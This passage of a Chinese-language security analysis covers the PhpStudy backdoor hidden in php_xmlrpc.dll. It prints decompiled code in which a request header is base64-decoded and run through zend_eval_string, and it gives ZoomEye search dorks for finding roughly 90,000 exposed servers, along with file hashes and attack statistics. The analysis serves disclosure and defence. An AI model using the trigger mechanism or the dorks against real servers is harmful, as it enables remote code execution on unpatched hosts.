    $p = $_SERVER['SERVER_PORT'];
    $fp = fsockopen($h, $p, $errno, $errstr, 5);
    if (!$fp) {
    } else {
     $out = "GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\r\n";
     $out .= "Host: {$h}\r\n";
     $out .= "Accept-Encoding: compress,gzip\r\n";
     $out .= "Connection: Close\r\n\r\n";
     fwrite($fp, $out);
     fclose($fp);
    }
#### 3.RCE远程命令执行
    if ( !strcmp(**v34, aGzipDeflate) )
        {
          if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &v39) != -1
            && zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &v37) != -1 )
          {
            v40 = base64_decode(**v37, strlen((const char *)**v37));
            if ( v40 )
            {
              v4 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
              v5 = *(_DWORD *)(v4 + 296);
              *(_DWORD *)(v4 + 296) = &v30;
              v35 = v5;
              v6 = setjmp3((int)&v30, 0);
              v7 = v35;
              if ( v6 )
                *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35;
              else
                zend_eval_string(v40, 0, &rce_cmd, a3);
              *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v7;
            }
          }
当请求头满足一定条件后，会提取一个请求头字段，进行base64解码，然后`zend_eval_string`执行解码后的exp。
研究了后门类型后，再来看看什么情况下会进入该函数触发该后门。查询`sub_100031F0`函数的引用信息发现：
    data:1000E5D4                 dd 0
    .data:1000E5D8                 dd 0
    .data:1000E5DC                 dd offset aXmlrpc       ; "xmlrpc"
    .data:1000E5E0                 dd offset off_1000B4B0
    .data:1000E5E4                 dd offset sub_10001010
    .data:1000E5E8                 dd 0
    .data:1000E5EC                 dd offset sub_100031F0
    .data:1000E5F0                 dd offset sub_10003710
    .data:1000E5F4                 dd offset sub_10001160
    .data:1000E5F8                 dd offset a051          ; "0.51"
该函数存在于一个结构体中，该结构体为`_zend_module_entry`结构体：
    //zend_modules.h
    struct _zend_module_entry {
        unsigned short size; //sizeof(zend_module_entry)
        unsigned int zend_api; //ZEND_MODULE_API_NO
        unsigned char zend_debug; //是否开启debug
        unsigned char zts; //是否开启线程安全
        const struct _zend_ini_entry *ini_entry;
        const struct _zend_module_dep *deps;
        const char *name; //扩展名称，不能重复
        const struct _zend_function_entry *functions; //扩展提供的内部函数列表
        int (*module_startup_func)(INIT_FUNC_ARGS); //扩展初始化回调函数，PHP_MINIT_FUNCTION或ZEND_MINIT_FUNCTION定义的函数
        int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS); //扩展关闭时回调函数
        int (*request_startup_func)(INIT_FUNC_ARGS); //请求开始前回调函数
        int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS); //请求结束时回调函数
        void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS); //php_info展示的扩展信息处理函数
        const char *version; //版本
        ...
        unsigned char type;
        void *handle;
        int module_number; //扩展的唯一编号
        const char *build_id;
    };
`sub_100031F0`函数为`request_startup_func`，该字段表示在请求初始化阶段回调的函数。从这里可以知道，只要php成功加载了存在后门的xmlrpc.dll，那么任何只要构造对应的后门请求头，那么就能触发后门。在Nginx服务器的情况下就算请求一个不存在的路径，也会触发该后门。
由于该后门存在于php的ext扩展中，所以不管是nginx还是apache还是IIS介受影响。
修复方案也很简单，把php的`php_xmlrpc.dll`替换成无后门的版本，或者现在直接去官网下载，官网现在的版本经检测都不存后门。
虽然又对后门的范围进行了一波研究，发现后门只存在于`php-5.4.45`和`php-5.2.17`两个版本中：
    $ grep "@eval" ./* -r
    Binary file ./php/php-5.4.45/ext/php_xmlrpc.dll matches
    Binary file ./php/php-5.2.17/ext/php_xmlrpc.dll matches
随后又在第三方网站上()上下载了phpstudy2016，却发现不存在后门:
    phpStudy20161103.zip压缩包md5：5bf5f785f027bf0c99cd02692cf7c322
    phpStudy20161103.exe   md5码：1a16183868b865d67ebed2fc12e88467
之后同事又发了我一份他2018年在官网下载的phpstudy2016，发现同样存在后门，跟2018版的一样，只有两个版本的php存在后门：
    MD5 (phpStudy20161103_backdoor.exe) = a63ab7adb020a76f34b053db310be2e9
    $ grep "@eval" ./* -r
    Binary file ./php/php-5.4.45/ext/php_xmlrpc.dll matches
    Binary file ./php/php-5.2.17/ext/php_xmlrpc.dll matches
查看发现第三方网站上是于2017-02-13更新的phpstudy2016。
### ZoomEye数据
通过ZoomEye探测phpstudy可以使用以下dork：
  1. "Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45" "Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17" +"X-Powered-By" -> 89,483
  2. +"nginx/1.11.5" +"PHP/5.2.17" -> 597 总量共计有90,080个目标现在可能会受到PhpStudy后门的影响。
可能受影响的目标全球分布概况：
![
](https://images.seebug.org/content/images/2019/09/a6e71197-53db-4098-bc97-5ab21b72cef3.png-w331s)
![
](https://images.seebug.org/content/images/2019/09/f5bfb5db-9b0f-4816-967a-0905e32dfa77.png-w331s)
可能受影响的目标全国分布概况：
![
](https://images.seebug.org/content/images/2019/09/88af7ec0-d782-4582-860a-51593fbf70ed.png-w331s)
![
](https://images.seebug.org/content/images/2019/09/cc68c2ee-65b0-417c-ad81-a303f26a0d61.png-w331s)
毕竟是国产软件，受影响最多的国家还是中国，其次是美国。对美国受影响的目标进行简单的探查发现基本都是属于IDC机房的机器，猜测都是国人在购买的vps上搭建的PhpStudy。
### 知道创宇云防御数据
知道创宇404积极防御团队检测到2019/09/24开始，互联网上有人开始对PhpStudy后门中的RCE进行利用。
2019/09/24攻击总数13320，攻击IP数110，被攻击网站数6570，以下是攻击来源TOP 20:
攻击来源 | 攻击次数  
---|---  
*.164.246.149 | 2251  
*.114.106.254 | 1829  
*.172.65.173 | 1561  
*.186.180.236 | 1476  
*.114.101.79 | 1355  
*.147.108.202 | 1167  
*.140.181.28 | 726  
*.12.203.223 | 476  
*.12.73.12 | 427  
*.12.183.161 | 297  
*.75.78.226 | 162  
*.12.184.173 | 143  
*.190.132.114 | 130  
*.86.46.71 | 126  
*.174.70.149 | 92  
*.167.156.78 | 91  
*.97.179.164 | 87  
*.95.235.26 | 83  
*.140.181.120 | 80  
*.114.105.176 | 76  
2019/09/25攻击总数45012，攻击IP数187，被攻击网站数10898，以下是攻击来源TOP 20:
攻击来源 | 攻击次数  
---|---  
*.114.101.79 | 6337  
*.241.157.69 | 5397  
*.186.180.236 | 5173  
*.186.174.48 | 4062  
*.37.87.81 | 3505  
*.232.241.237 | 2946  
*.114.102.5 | 2476  
*.162.20.54 | 2263  
*.157.96.89 | 1502  
*.40.8.29 | 1368  
*.94.10.195 | 1325  
*.186.41.2 | 1317  
*.114.102.69 | 1317  
*.114.106.254 | 734  
*.114.100.144 | 413  
*.114.107.73 | 384  
*.91.170.36 | 326  
*.100.96.67 | 185  
*.83.189.86 | 165  
*.21.136.203 | 149  
攻击源国家分布：
国家 | 数量  
---|---  
中国 | 34  
美国 | 1  
韩国 | 1  
德国 | 1  
省份分布：
省份 | 数量  
---|---  
云南 | 7  
北京 | 6  
江苏 | 6  
广东 | 4  
香港 | 4  
上海 | 2  
浙江 | 2  
重庆 | 1  
湖北 | 1  
四川 | 1  
攻击payload:
![
](https://images.seebug.org/content/images/2019/09/0efe14fc-c086-4fe4-87e0-6ffb492bff8b.png-w331s)
* * *